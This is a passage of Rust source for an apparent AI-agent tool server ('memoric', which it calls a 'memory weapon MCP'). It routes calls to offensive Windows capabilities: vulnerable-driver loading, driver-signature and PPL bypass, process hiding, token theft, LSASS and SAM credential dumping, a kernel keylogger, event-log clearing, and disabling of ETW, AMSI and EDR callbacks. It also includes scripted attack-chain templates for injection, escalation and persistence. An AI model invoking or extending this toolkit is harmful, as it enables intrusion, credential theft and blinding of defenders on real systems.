                "enum, remove, nuke",
            ))
        }
    };
    let callout_id = args.get("callout_id").and_then(|v| v.as_u64()).unwrap_or(0);
    let provider = args
        .get("provider_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let r = drv
        .wfp_remove(action_code, callout_id, provider)
        .map_err(|e| e.to_string())?;
    let mut entries_json = Vec::new();
    for i in 0..r.total_callouts.min(32) as usize {
        let e = &r.entries[i];
        if e.callout_id == 0 && e.function_addr == 0 {
            continue;
        }
        let name = String::from_utf16_lossy(&e.provider_name)
            .trim_end_matches('\0')
            .to_string();
        entries_json.push(json!({
            "index": i,
            "callout_id": e.callout_id,
            "function_addr": format!("0x{:016X}", e.function_addr),
            "provider_name": name,
            "layer_id": e.layer_id,
            "active": e.active == 1,
        }));
    }
    Ok(json!({
        "success": r.success == 1,
        "technique": "wfp_remove",
        "action": action,
        "total_callouts": r.total_callouts,
        "removed_count": r.removed_count,
        "entries": entries_json,
    }))
}

fn kernel_action_help(action: &str) -> String {
    format!(
        "Unknown kernel action: {}. Route groups: generic=[driver_load, driver_unload, driver_discover, driver_auto, read, write, physical_read, physical_write, pte_modify, vad_hide, enum_callbacks, remove_callback], hybrid=[ppl_bypass, dkom_hide, token_escalate], direct_memoric=[driver_enum_process, driver_callback_enum, driver_reg_protect, driver_notify_routine, driver_process_dump, driver_global_hook, driver_ppl_bypass, driver_kernel_apc, driver_wfp_remove]. Prefer canonical driver_* names. Legacy aliases notify_routine/reg_protect/object_hook/port_hide are normalized automatically. Examples: kernel(action='driver_notify_routine', notify_action='query'), kernel(action='driver_reg_protect', reg_action='list'), kernel(action='driver_process_dump', pid=1234, max_size=1048576). Call `memoric` with domain='kernel' for the current grouped action catalog.",
        action
    )
}

fn handle_kernel(args: &Value) -> Result<Value, String> {
    let normalized = normalize_kernel_args(args);
    let args = &normalized;
    let action = require_action(args, "kernel", "driver_load, driver_unload, driver_discover, driver_auto, read, write, physical_read, physical_write, pte_modify, vad_hide, sniff_start, sniff_stop, enum_callbacks, remove_callback, object_callback_enum, object_callback_remove, registry_callback_enum, registry_callback_remove, ppl_bypass, dse_bypass, dse_map_driver, dkom_hide, module_hide, minifilter_enum, minifilter_remove, token_escalate, etw_ti_remove, and direct driver_* actions")?;
    let memoric_available_before = if is_memoric_direct_kernel_action(action)
        || (is_hybrid_kernel_action(action)
            && args
                .get("device_path")
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())
                .is_none())
    {
        crate::driver::MemoricDriver::is_available()
    } else {
        false
    };

    let result = match action {
        // Driver management
        "driver_load" => crate::kernel::load_driver(args).map_err(|e| e.to_string()),
        "driver_unload" => crate::kernel::unload_driver(args).map_err(|e| e.to_string()),
        "driver_discover" => {
            crate::kernel::discover_vulnerable_drivers(args).map_err(|e| e.to_string())
        }
        "driver_auto" => crate::kernel::auto_load_driver(args).map_err(|e| e.to_string()),

        // Memory operations
        "read" => {
            let physical = args
                .get("physical")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if physical {
                crate::memory::read_physical_memory(args).map_err(|e| e.to_string())
            } else {
                crate::kernel::driver_read_memory(args).map_err(|e| e.to_string())
            }
        }
        "write" => crate::kernel::driver_write_memory(args).map_err(|e| e.to_string()),
        "physical_read" => {
            let address = require_u64_param(args, "address", "kernel", "physical_read")?;
            let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(8) as usize;
            crate::bruteforce::physical_memory::read_physical_memory(address, size)
                .map(|data| json!({"success": true, "address": format!("0x{:016X}", address), "bytes_read": data.len(), "hex": hex::encode(&data)}))
                .map_err(|e| e.to_string())
        }
        "physical_write" => {
            let address = require_u64_param(args, "address", "kernel", "physical_write")?;
            let bytes: Vec<u8> = args
                .get("bytes")
                .and_then(|v| v.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|v| v.as_u64().map(|n| n as u8))
                        .collect()
                })
                .ok_or_else(|| {
                    missing_param_error(
                        "kernel",
                        "physical_write",
                        "bytes",
                        Some("Provide an array like bytes=[144, 144, 195]."),
                    )
                })?;
            crate::bruteforce::physical_memory::write_physical_memory(address, &bytes)
                .map(|written| json!({"success": true, "address": format!("0x{:016X}", address), "bytes_written": written}))
                .map_err(|e| e.to_string())
        }

        // PTE/VAD (from bruteforce, via BYOVD)
        "pte_modify" => pte_modify_via_driver(args),
        "vad_hide" => vad_hide_via_driver(args),

        // Sniffing (from bruteforce)
        "sniff_start" => {
            let pid = require_u64_param(args, "pid", "kernel", "sniff_start")? as u32;
            let config = crate::bruteforce::sniffing::SniffingConfig {
                target_pid: pid,
                address_ranges: vec![],
                mode: crate::bruteforce::sniffing::SniffMode::All,
                callback_id: format!("sniff_{}", pid),
            };
            crate::bruteforce::sniffing::start_sniffing(config).map_err(|e| e.to_string())
        }
        "sniff_stop" => crate::bruteforce::sniffing::stop_all_sniffing().map_err(|e| e.to_string()),

        // Kernel operations
        "enum_callbacks" => crate::kernel::enum_kernel_callbacks(args).map_err(|e| e.to_string()),
        "remove_callback" => crate::kernel::remove_kernel_callback(args).map_err(|e| e.to_string()),
        "object_callback_enum" => {
            crate::kernel::object_callback_enum(args).map_err(|e| e.to_string())
        }
        "object_callback_remove" => {
            crate::kernel::object_callback_remove(args).map_err(|e| e.to_string())
        }
        "registry_callback_enum" => {
            crate::kernel::registry_callback_enum(args).map_err(|e| e.to_string())
        }
        "registry_callback_remove" => {
            crate::kernel::registry_callback_remove(args).map_err(|e| e.to_string())
        }
        "notify_routine" | "driver_notify_routine" => driver_notify_routine(args),
        "reg_protect" | "driver_reg_protect" => driver_reg_protect(args),
        "object_hook" | "driver_object_hook" => driver_object_hook(args),
        "port_hide" | "driver_port_hide" => driver_port_hide(args),
        "ppl_bypass" => memoric_driver_or_byovd(args, "ppl_bypass"),
        "dse_bypass" => crate::kernel::dse_bypass(args).map_err(|e| e.to_string()),
        "dse_map_driver" => crate::kernel::dse_map_driver(args).map_err(|e| e.to_string()),
        "dkom_hide" => memoric_driver_or_byovd(args, "dkom_hide"),
        "module_hide" => crate::kernel::kernel_module_hide(args).map_err(|e| e.to_string()),
        "minifilter_enum" => crate::kernel::minifilter_enum(args).map_err(|e| e.to_string()),
        "minifilter_remove" => crate::kernel::minifilter_remove(args).map_err(|e| e.to_string()),
        "token_escalate" => memoric_driver_or_byovd(args, "token_escalate"),
        "etw_ti_remove" => crate::kernel::etw_ti_remove(args).map_err(|e| e.to_string()),

        // Native driver IOCTLs (memoric.sys direct)
        "driver_enum_process" => driver_enum_process(args),
        "driver_module_hide" => driver_module_hide(args),
        "driver_thread_hide" => driver_thread_hide(args),
        "driver_callback_enum" => driver_callback_enum(args),
        "driver_callback_remove" => driver_callback_remove(args),
        "driver_patch_kernel" => driver_patch_kernel(args),
        "driver_apc_inject" => driver_apc_inject(args),
        "driver_handle_strip" => driver_handle_strip(args),
        "driver_pe_dump" => driver_pe_dump(args),
        "driver_set_debug_port" => driver_set_debug_port(args),
        "driver_dpc_timer" => driver_dpc_timer(args),
        "driver_token_dup" => driver_token_dup(args),
        "driver_stats" => driver_stats(args),
        "driver_memory_pool" => driver_memory_pool(args),
        "driver_minifilter_enum" => driver_minifilter_enum(args),
        "driver_process_dump" => driver_process_dump(args),
        "driver_hypervisor_detect" => driver_hypervisor_detect(args),
        "driver_testsign_hide" => driver_testsign_hide(args),
        "driver_global_hook" => driver_global_hook(args),
        "driver_auto_inject" => driver_auto_inject(args),
        "driver_infinity_hook" => driver_infinity_hook(args),
        "driver_ci_callback_patch" => driver_ci_callback_patch(args),
        "driver_ci_func_patch" => driver_ci_func_patch(args),
        "driver_pte_rw" => driver_pte_rw(args),
        "driver_msr_rw" => driver_msr_rw(args),
        "driver_cloak" => driver_cloak(args),
        "driver_force_kill" => driver_force_kill(args),
        "driver_force_delete" => driver_force_delete(args),
        "driver_system_thread" => driver_system_thread(args),
        "driver_kernel_exec" => driver_kernel_exec(args),
        // Phase 12 remaining
        "driver_ppl_bypass" => driver_ppl_bypass(args),
        "driver_cr_rw" => driver_cr_rw(args),
        "driver_idt_rw" => driver_idt_rw(args),
        "driver_unloaded_drv_clear" => driver_unloaded_drv_clear(args),
        "driver_token_swap" => driver_token_swap(args),
        "driver_process_protect" => driver_process_protect(args),
        // Phase 13
        "driver_keylogger" => driver_keylogger(args),
        "driver_reg_hide" => driver_reg_hide(args),
        "driver_file_lock" => driver_file_lock(args),
        "driver_etw_blind" => driver_etw_blind(args),
        "driver_eprocess_spoof" => driver_eprocess_spoof(args),
        "driver_event_log_clear" => driver_event_log_clear(args),
        "driver_cred_dump" => driver_cred_dump(args),
        "driver_impersonate" => driver_driver_impersonate(args),
        // Phase 14: EDR Annihilation
        "driver_callback_nuke" => driver_callback_nuke(args),
        "driver_minifilter_detach" => driver_minifilter_detach(args),
        "driver_kernel_apc" => driver_kernel_apc(args),
        "driver_wfp_remove" => driver_wfp_remove(args),

        _ => Err(kernel_action_help(action)),
    }?;

    Ok(annotate_kernel_result(
        result,
        action,
        args,
        memoric_available_before,
    ))
}

fn handle_self(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "self", SELF_ACTIONS)?;

    match action {
        // Introspection
        "peb" => crate::info::read_peb(args).map_err(|e| e.to_string()),
        "heap" => crate::info::heap_query(args).map_err(|e| e.to_string()),
        "test" => crate::memory::memory_self_test(args).map_err(|e| e.to_string()),

        // Self-protection (from bruteforce)
        "protect_init" => {
            let config = crate::bruteforce::self_protect::ProtectionConfig::default();
            crate::bruteforce::self_protect::init_self_protection(config).map_err(|e| e.to_string())
        }
        "protect_encrypt" => {
            let address = require_u64_param(args, "address", "self", "protect_encrypt")? as usize;
            let size = require_u64_param(args, "size", "self", "protect_encrypt")? as usize;
            crate::bruteforce::self_protect::encrypt_region(address, size)
                .map_err(|e| e.to_string())
        }
        "protect_decrypt" => {
            let address = require_u64_param(args, "address", "self", "protect_decrypt")? as usize;
            crate::bruteforce::self_protect::decrypt_region(address).map_err(|e| e.to_string())
        }
        "protect_wipe" => {
            let address = require_u64_param(args, "address", "self", "protect_wipe")? as usize;
            let size = require_u64_param(args, "size", "self", "protect_wipe")? as usize;
            crate::bruteforce::self_protect::secure_wipe(address, size).map_err(|e| e.to_string())
        }

        // Version / info
        "info" | "version" | "status" => {
            let pid = std::process::id();
            let exe = std::env::current_exe()
                .map(|p| p.display().to_string())
                .unwrap_or_default();
            let admin = crate::privilege::uac::is_admin().unwrap_or(json!(false));

            let readiness = runtime_readiness_json(args);

            Ok(json!({
                "name": "memoric",
                "version": env!("CARGO_PKG_VERSION"),
                "pid": pid,
                "executable": exe,
                "is_admin": admin,
                "arch": std::env::consts::ARCH,
                "os": std::env::consts::OS,
                "driver": readiness.get("driver").cloned().unwrap_or_else(|| json!(null)),
                "readiness": readiness,
                "tools": 12,
                "scan_modes": 12,
                "kernel_ioctls": 37
            }))
        }

        // Anti-debug check
        "anti_debug" => {
            let is_debugged = unsafe {
                windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool()
            };
            Ok(json!({
                "is_debugged": is_debugged,
                "warning": if is_debugged { "Debugger detected!" } else { "No debugger detected" }
            }))
        }

        // Session state query / refresh
        "state" => {
            let sub_action = args
                .get("sub_action")
                .and_then(|v| v.as_str())
                .unwrap_or("get");
            match sub_action {
                "reset" => {
                    crate::state::reset_session();
                    Ok(json!({"state": "reset"}))
                }
                "score" => {
                    let score = crate::state::compute_stealth_score();
                    crate::state::update_stealth_score(score.clone());
                    serde_json::to_value(&score).map_err(|e| e.to_string())
                }
                _ => crate::state::get_state_json().map_err(|e| e.to_string()),
            }
        }

        _ => Err(unknown_action_error("self", action, SELF_ACTIONS)),
    }
}

fn handle_orchestrate(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "orchestrate", ORCHESTRATE_ACTIONS)?;

    match action {
        "assess" => {
            crate::orchestration::engine::assess_environment(args).map_err(|e| e.to_string())
        }
        "execute" => crate::orchestration::engine::execute_chain(args).map_err(|e| e.to_string()),
        "plan" => crate::orchestration::engine::plan_chain(args).map_err(|e| e.to_string()),

        // Pre-built attack templates
        "templates" => Ok(json!({
            "templates": {
                "stealth_inject": {
                    "description": "Stealthy process injection with full evasion",
                    "steps": [
                        "1. orchestrate(action='assess', pid=X) → detect EDR and pick evasion profile",
                        "2. stealth(action='patch_etw') → disable ETW",
                        "3. stealth(action='patch_amsi') → disable AMSI",
                        "4. stealth(action='unhook_ntdll') → remove user-mode hooks",
                        "5. inject(action='shellcode', pid=X, method='threadless', shellcode=[...]) → inject payload",
                        "6. stealth(action='sleep_foliage', delay_ms=5000) → encrypted sleep"
                    ]
                },
                "privilege_escalation": {
                    "description": "Full privilege escalation chain",
                    "steps": [
                        "1. privilege(action='check') → current level",
                        "2. privilege(action='service_unquoted') → scan services",
                        "3. privilege(action='service_weak_perms') → scan permissions",
                        "4. privilege(action='potato', method='print_spoofer') → impersonation",
                        "5. privilege(action='elevate', method='auto') → UAC bypass"
                    ]
                },
                "persistence": {
                    "description": "Establish driver-level persistence",
                    "steps": [
                        "1. privilege(action='check') → must be admin",
                        "2. kernel(action='driver_auto') → locate or load a usable driver path",
                        "3. kernel(action='driver_notify_routine', notify_action='register', notify_type='process') → monitor processes",
                        "4. kernel(action='driver_reg_protect', reg_action='add', key_path='\\Registry\\Machine\\SOFTWARE\\...') → protect registry keys",
                        "5. kernel(action='dkom_hide', pid=X) → hide process"
                    ]
                },
                "reconnaissance": {
                    "description": "Full target reconnaissance",
                    "steps": [
                        "1. target(action='ps_list') → enumerate processes",
                        "2. detect(action='edr_products') → identify security",
                        "3. detect(action='vm_sandbox') → VM check",
                        "4. target(action='handles', pid=X) → enumerate handles",
                        "5. target(action='env', pid=X) → environment vars",
                        "6. memory(action='scan', pid=X, scan_mode='string', pattern='password') → string search"
                    ]
                },
                "memory_forensics": {
                    "description": "Session-based memory scanning workflow",
                    "steps": [
                        "1. memory(action='scan_new', pid=X, value_type='u32', value=100) → create scan session",
                        "2. memory(action='scan_next', session_id='scan_N', filter='changed') → narrow after value changes",
                        "3. memory(action='scan_next', session_id='scan_N', filter='exact', value=110) → keep exact matches",
                        "4. memory(action='scan_list') → inspect active sessions/results",
                        "5. memory(action='scan_freeze', session_id='scan_N', value=999) → force all matches"
                    ]
                }
            }
        })),

        // Whoami-style status summary
        "status" => {
            let admin = crate::privilege::uac::is_admin().unwrap_or(json!(false));
            let uac = crate::privilege::check_uac_status(&json!({})).map_err(|e| e.to_string())?;

            // Quick EDR check
            let edr = crate::evasion::edr::detect_edr_products(&json!({})).ok();

            let readiness = runtime_readiness_json(args);

            Ok(json!({
                "is_admin": admin,
                "uac": uac,
                "edr_detected": edr,
                "driver": readiness.get("driver").cloned().unwrap_or_else(|| json!(null)),
                "readiness": readiness,
                "pid": std::process::id(),
                "arch": std::env::consts::ARCH,
            }))
        }

        _ => Err(unknown_action_error(
            "orchestrate",
            action,
            ORCHESTRATE_ACTIONS,
        )),
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Guide Implementation
// ═════════════════════════════════════════════════════════════════════════════

fn memoric_guide(args: &Value) -> Result<Value, String> {
    let domain = args.get("domain").and_then(|v| v.as_str());
    let goal = args.get("goal").and_then(|v| v.as_str());
    let status = args
        .get("status")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if status {
        let admin = crate::privilege::uac::is_admin().map_err(|e| e.to_string())?;
        let uac = crate::privilege::check_uac_status(&json!({})).map_err(|e| e.to_string())?;
        let readiness = runtime_readiness_json(args);
        return Ok(json!({
            "is_admin": admin,
            "uac": uac,
            "readiness": readiness,
            "server": "memoric",
            "version": env!("CARGO_PKG_VERSION"),
            "mode": "consolidated memory weapon MCP",
            "tools": ["memoric", "target", "memory", "inject", "payload", "hook", "stealth", "detect", "privilege", "kernel", "self", "orchestrate"]
        }));
    }

    if let Some(goal) = goal {
        return suggest_workflow(goal);
    }

    match domain {
        Some("target") => Ok(json!({
            "domain": "target",
            "description": "Process/thread/module acquisition",
            "actions": ["ps_list", "ps_find", "ps_info", "modules", "threads", "threads_list", "thread_suspend", "thread_resume", "thread_context", "handles", "env", "cmdline", "windows", "peb", "module_base", "mem_find", "string_read", "string_write", "callstack", "heap", "cred_dump", "sam_dump", "kerberos_tickets"],
            "new_actions": {
                "handles": "Enumerate process handles (type_filter, limit, offset)",
                "env": "Read process environment variables",
                "cmdline": "Read process command line",
                "windows": "Enumerate process windows",
                "peb": "Read Process Environment Block (base address, heap, image path)",
                "module_base": "Get single module base address by name",
                "threads_list": "Explicit thread listing action without thread_context fallback",
                "mem_find": "Find memory region by pattern or address range",
                "string_read": "Read null-terminated string from remote memory",
                "string_write": "Write string to remote process memory",
                "callstack": "Unwind thread call stack (StackWalk64)",
                "heap": "Enumerate heap structures and allocations",
                "cred_dump": "Extract credentials from LSASS memory dump",
                "sam_dump": "Dump SAM/SECURITY registry hives via RegSaveKeyExW",
                "kerberos_tickets": "Extract Kerberos TGT/ST from LSA ticket cache"
            }
        })),
        Some("memory") => Ok(json!({
            "domain": "memory",
            "description": "Core memory R/W/scan/management + Cheat Engine-style scan sessions",
            "actions": ["read", "write", "write_string", "scan", "query", "query_find", "alloc", "free", "protect", "scan_new", "scan_next", "scan_undo", "scan_list", "scan_reset", "scan_freeze"],
            "read_modes": ["raw", "string", "stealth", "scattered", "physical"],
            "scan_modes": ["exact", "changed", "pattern", "stealth_pattern", "range", "delta", "string", "unknown", "pointer", "aob", "aligned", "multi"],
            "scan_mode_details": {
                "exact": "Scan for exact value (int/float/string/bytes)",
                "write_string": "Explicit string write action; preferred over write(text=...) for AI callers",
                "query_find": "Explicit filtered region lookup; preferred over query(filter=...) for AI callers",
                "changed": "Rescan: find values that changed/unchanged/increased/decreased",
                "pattern": "IDA-style byte signature (48 8B ?? ?? ??)",
                "stealth_pattern": "Pattern scan via BYOVD kernel driver (anti-cheat bypass)",
                "range": "Scan for values within min-max range",
                "delta": "Scan for values changed by specific ± amount",
                "string": "Scan for ANSI/Unicode strings (case-insensitive)",
                "unknown": "Initial unknown value scan (record all, refine later)",
                "pointer": "Pointer chain scanner for multi-level pointers",
                "aob": "Raw array-of-bytes pattern with ?? wildcards",
                "aligned": "Scan at aligned addresses only (faster, less noise)",
                "multi": "Scan for any of multiple values simultaneously"
            },
            "scan_session_workflow": [
                "1. scan_new(pid, value_type, value) → create session, first scan",
                "2. scan_next(session_id, filter='changed'/'unchanged'/'exact'/'increased'/'decreased') → narrow",
                "3. scan_undo(session_id) → restore previous results",
                "4. scan_freeze(session_id, value) → write value to all matches",
                "5. scan_reset(session_id) → delete session"
            ]
        })),
        Some("inject") => Ok(json!({
            "domain": "inject",
            "description": "Code injection & execution",
            "actions": {
                "shellcode": ["thread", "apc", "special_apc", "mapping", "mockingjay", "atom", "callback_enum", "propagate", "instrumentation", "kernel_callback", "wow64", "heaven_gate", "stomp", "threadless", "workitem", "pool_party"],
                "dll": ["classic", "manual_map", "phantom", "reflective"],
                "spawn": ["hollow", "ghost", "doppelgang", "herpaderp", "early_bird", "transacted"],
                "hijack": ["hijack_enum", "hijack_backup", "hijack_redirect", "hijack_restore", "hijack_wait"],
                "direct": ["create_remote_thread", "nt_create_thread"],
                "alternative": ["fiber", "threadpool", "stack_bomb"],
                "pool_party_variants": ["pool_party_worker", "pool_party_work", "pool_party_direct", "pool_party_timer"],
                "advanced_dll": ["export_forward", "phantom_hollow", "transacted_hollow"],
                "detection": ["wow64_detect"]
            },
            "new_actions": {
                "create_remote_thread": "Direct CreateRemoteThread wrapper",
                "nt_create_thread": "NtCreateThreadEx syscall-based thread creation",
                "fiber": "Fiber-based code execution (ConvertThreadToFiber → CreateFiber → SwitchToFiber)",
                "threadpool": "Thread pool callback injection (QueueUserWorkItem)",
                "stack_bomb": "Stack overflow exploitation for code injection",
                "pool_party_worker": "Pool Party: worker factory variant",
                "pool_party_work": "Pool Party: TP_WORK variant",
                "pool_party_direct": "Pool Party: TP_DIRECT variant",
                "pool_party_timer": "Pool Party: TP_TIMER variant",
                "export_forward": "DLL export forwarding hijack",
                "phantom_hollow": "Phantom DLL hollowing variant",
                "transacted_hollow": "Transactional process hollowing (NTFS transactions)",
                "wow64_detect": "Detect WoW64 architecture mismatch pre-injection"
            }
        })),
        Some("payload") => Ok(json!({
            "domain": "payload",
            "description": "PE parsing, obfuscation & lifecycle",
            "actions": ["pe_parse", "obfuscate", "wait", "exit_code", "cleanup", "serialize"],
            "obf_methods": ["xor", "rc4", "aes_ctr", "polymorphic", "uuid", "ipv4", "mac", "transform", "strings"]
        })),
        Some("hook") => Ok(json!({
            "domain": "hook",
            "description": "Function hooking",
            "actions": ["install", "remove", "install_hwbp", "remove_hwbp", "install_iat", "remove_iat", "trampoline", "detour", "restore", "winhook", "hwbp_syscall"],
            "new_actions": {
                "trampoline": "Generate trampoline code for detour-style hooks",
                "detour": "Transactional hook install (atomic multi-hook)",
                "restore": "Restore hooked function to original bytes",
                "winhook": "SetWindowsHookEx injection into GUI thread",
                "hwbp_syscall": "Syscall interception via hardware breakpoints"
            }
        })),
        Some("stealth") => Ok(json!({
            "domain": "stealth",
            "description": "Defense evasion",
            "actions": ["patch_etw", "patch_amsi", "patch_cfg", "patch_cig", "unhook_ntdll", "unhook_function", "hide_module", "fluctuate_module", "module_stomp", "sleep_ekko", "sleep_foliage", "sleep_gargoyle", "sleep_death", "spoof_callstack", "spoof_ppid", "spoof_return", "deep_stack_spoof", "syscall_write", "syscall_alloc", "syscall_protect", "syscall_thread", "syscall_open", "syscall_read", "syscall_query", "syscall_close", "syscall_free", "syscall_stealth_read", "syscall_inject", "encrypt_memory", "decrypt_memory", "mutate_code", "sysmon_blind", "timestomp", "etw_provider_disable", "etw_mass_disable", "create_suspended", "testsign_launch_hooked", "testsign_kernel_bypass", "testsign_launch_clean", "sentinel_start", "sentinel_stop", "sentinel_status", "sentinel_self_destruct", "callback_enum_by_driver", "callback_masquerade", "etw_ti_selective_disable", "minifilter_enum_classified", "minifilter_selective_detach", "minifilter_pause", "minifilter_resume"],
            "new_actions": {
                "unhook_function": "Restore a single hooked function (vs mass ntdll unhook)",
                "module_stomp": "Advanced module stomping (overwrite legitimate module code section)",
                "etw_provider_disable": "Disable specific ETW provider by GUID",
                "etw_mass_disable": "Mass-disable all ETW sessions system-wide",
                "create_suspended": "Create a pre-suspended thread for manual context setup",
                "testsign_launch_hooked": "Launch an exe with NtQuerySystemInformation + NtQueryLicenseValue pre-hooked (inline hooks — detectable by integrity checks)",
                "testsign_kernel_bypass": "STEALTH: Patch g_CiOptions in CI.dll kernel memory — no user-mode hooks, invisible to anti-cheat. Use with testsign_launch_clean.",
                "testsign_launch_clean": "Launch exe with kernel-level CI bypass — no SUSPENDED, no inline hooks, no code modification. Anti-cheat safe.",
                "sentinel_start": "Start continuous evasion daemon (ETW/AMSI re-patch, module re-hide, watchdog, self-destruct)",
                "sentinel_stop": "Stop the sentinel background thread",
                "sentinel_status": "Query sentinel heartbeat count, uptime, active features",
                "sentinel_self_destruct": "7-pass DoD 5220.22-M memory wipe + self-terminate",
                "callback_enum_by_driver": "Enumerate kernel callbacks with driver attribution (which EDR owns each callback)",
                "callback_masquerade": "Replace EDR callback with no-op trampoline (evades integrity checks vs zeroing)",
                "etw_ti_selective_disable": "Disable specific ETW-TI providers by name (targeted vs mass disable)",
                "minifilter_enum_classified": "Enumerate minifilters with altitude-based EDR classification",
                "minifilter_selective_detach": "Detach only EDR minifilters, preserving system-critical filters",
                "minifilter_pause": "Pause EDR minifilter instance (stealthier than detach)",
                "minifilter_resume": "Resume a paused minifilter instance"
            }
        })),
        Some("detect") => Ok(json!({
            "domain": "detect",
            "description": "System reconnaissance",
            "actions": ["edr_products", "edr_hooks", "edr_quick_check", "edr_suspend", "etw_sessions", "veh_chain", "vm_sandbox", "hypervisor", "forensics", "integrity", "hooks", "hook_function", "syscall_resolve"],
            "new_actions": {
                "hook_function": "Explicit single-function hook check using function_name",
                "syscall_resolve": "Resolve syscall number (SSN) for a given Nt/Zw function name"
            }
        })),
        Some("privilege") => Ok(json!({
            "domain": "privilege",
            "description": "Privilege escalation",
            "actions": ["elevate", "token_steal", "token_impersonate", "token_revert", "token_scan", "debug_priv", "check", "potato", "service_unquoted", "service_weak_perms", "service_always_elevated", "symlink"],
            "potato_methods": ["print_spoofer", "god_potato", "efs_potato"],
            "service_abuse": "service_unquoted scans for unquoted paths, service_weak_perms scans for weak service permissions, service_always_elevated checks AlwaysInstallElevated",
            "elevate_methods": ["auto", "fodhelper", "eventvwr", "computerdefaults", "sdclt", "disk_cleanup", "mock_trusted_dir", "request_uac", "system"]
        })),
        Some("kernel") => Ok(json!({
            "domain": "kernel",
            "description": "Kernel operations across three paths: generic helpers, hybrid memoric.sys/BYOVD actions, and direct memoric.sys IOCTL wrappers.",
            "actions": ["driver_load", "driver_unload", "driver_discover", "driver_auto", "read", "write", "physical_read", "physical_write", "pte_modify", "vad_hide", "sniff_start", "sniff_stop", "enum_callbacks", "remove_callback", "object_callback_enum", "object_callback_remove", "registry_callback_enum", "registry_callback_remove", "driver_notify_routine", "driver_reg_protect", "driver_object_hook", "driver_port_hide", "ppl_bypass", "dse_bypass", "dse_map_driver", "dkom_hide", "module_hide", "minifilter_enum", "minifilter_remove", "token_escalate", "etw_ti_remove", "driver_enum_process", "driver_module_hide", "driver_thread_hide", "driver_callback_enum", "driver_callback_remove", "driver_patch_kernel", "driver_apc_inject", "driver_handle_strip", "driver_pe_dump", "driver_set_debug_port", "driver_dpc_timer", "driver_token_dup", "driver_stats", "driver_memory_pool", "driver_minifilter_enum", "driver_process_dump", "driver_hypervisor_detect", "driver_testsign_hide", "driver_global_hook", "driver_auto_inject", "driver_infinity_hook", "driver_ci_callback_patch", "driver_ci_func_patch", "driver_pte_rw", "driver_msr_rw", "driver_cloak", "driver_force_kill", "driver_force_delete", "driver_system_thread", "driver_kernel_exec", "driver_ppl_bypass", "driver_cr_rw", "driver_idt_rw", "driver_unloaded_drv_clear", "driver_token_swap", "driver_process_protect", "driver_keylogger", "driver_reg_hide", "driver_file_lock", "driver_etw_blind", "driver_eprocess_spoof", "driver_event_log_clear", "driver_cred_dump", "driver_impersonate", "driver_callback_nuke", "driver_minifilter_detach", "driver_kernel_apc", "driver_wfp_remove"],
            "action_groups": {
                "generic": ["driver_load", "driver_unload", "driver_discover", "driver_auto", "read", "write", "physical_read", "physical_write", "pte_modify", "vad_hide", "sniff_start", "sniff_stop", "enum_callbacks", "remove_callback", "object_callback_enum", "object_callback_remove", "registry_callback_enum", "registry_callback_remove", "dse_bypass", "dse_map_driver", "module_hide", "minifilter_enum", "minifilter_remove", "etw_ti_remove"],
                "hybrid": ["ppl_bypass", "dkom_hide", "token_escalate"],
                "direct_driver_core": ["driver_enum_process", "driver_module_hide", "driver_thread_hide", "driver_callback_enum", "driver_callback_remove", "driver_patch_kernel", "driver_apc_inject", "driver_handle_strip", "driver_reg_protect", "driver_notify_routine", "driver_pe_dump", "driver_set_debug_port", "driver_dpc_timer", "driver_port_hide", "driver_token_dup", "driver_object_hook", "driver_stats", "driver_memory_pool", "driver_minifilter_enum", "driver_process_dump", "driver_hypervisor_detect"],
                "direct_driver_advanced": ["driver_testsign_hide", "driver_global_hook", "driver_auto_inject", "driver_infinity_hook", "driver_ci_callback_patch", "driver_ci_func_patch", "driver_pte_rw", "driver_msr_rw", "driver_cloak", "driver_force_kill", "driver_force_delete", "driver_system_thread", "driver_kernel_exec", "driver_ppl_bypass", "driver_cr_rw", "driver_idt_rw", "driver_unloaded_drv_clear", "driver_token_swap", "driver_process_protect", "driver_keylogger", "driver_reg_hide", "driver_file_lock", "driver_etw_blind", "driver_eprocess_spoof", "driver_event_log_clear", "driver_cred_dump", "driver_impersonate", "driver_callback_nuke", "driver_minifilter_detach", "driver_kernel_apc", "driver_wfp_remove"]
            },
            "hybrid_behavior": {
                "ppl_bypass": "If device_path is provided, use BYOVD helper. Otherwise require memoric.sys and remove PPL directly.",
                "dkom_hide": "If device_path is provided, use generic/BYOVD DKOM path. Otherwise use memoric.sys direct EPROCESS unlink.",
                "token_escalate": "If device_path is provided, use generic/BYOVD token helper. Otherwise use memoric.sys token steal path."
            },
            "byovd_requirements": {
                "pte_modify": ["device_path", "read_ioctl", "write_ioctl", "address", "cr3"],
                "vad_hide": ["device_path", "read_ioctl", "write_ioctl", "pid", "address"]
            },
            "native_driver_actions": {
                "driver_enum_process": "Enumerate ActiveProcessLinks from kernel ground truth",
                "driver_reg_protect": "Protect/list registry keys via kernel callback",
                "driver_notify_routine": "Register/unregister/query process/thread/image notifications",
                "driver_memory_pool": "Query kernel pool allocations by pool_tag + max_entries",
                "driver_process_dump": "Dump process regions from kernel using pid/flags/base_address/max_size",
                "driver_ppl_bypass": "Direct memoric.sys PPL strip/set/query using ppl_action",
                "driver_cr_rw": "Read/write control registers using cr_action/cr_index/value",
                "driver_idt_rw": "Read/write/dump IDT entries using idt_action/vector/new_handler/new_dpl",
                "driver_keylogger": "Start/stop/read/query keyboard capture using keylog_action",
                "driver_cred_dump": "Find/read/dump LSASS-related credential memory using cred_action",
                "driver_wfp_remove": "Enumerate/remove/nuke WFP callouts using wfp_action"
            }
        })),
        Some("self") => Ok(json!({
            "domain": "self",
            "description": "Self introspection & protection",
            "actions": ["peb", "heap", "test", "status", "protect_init", "protect_encrypt", "protect_decrypt", "protect_wipe", "info", "version", "anti_debug"],
            "new_actions": {
                "info/version": "Server version, PID, arch, driver status, tool count",
                "status": "Alias of info for legacy whoami-style status checks",
                "anti_debug": "Check if debugger is attached"
            }
        })),
        Some("orchestrate") => Ok(json!({
            "domain": "orchestrate",
            "description": "Automated attack chain orchestration with adaptive evasion",
            "actions": ["assess", "execute", "plan", "templates", "status"],
            "new_actions": {
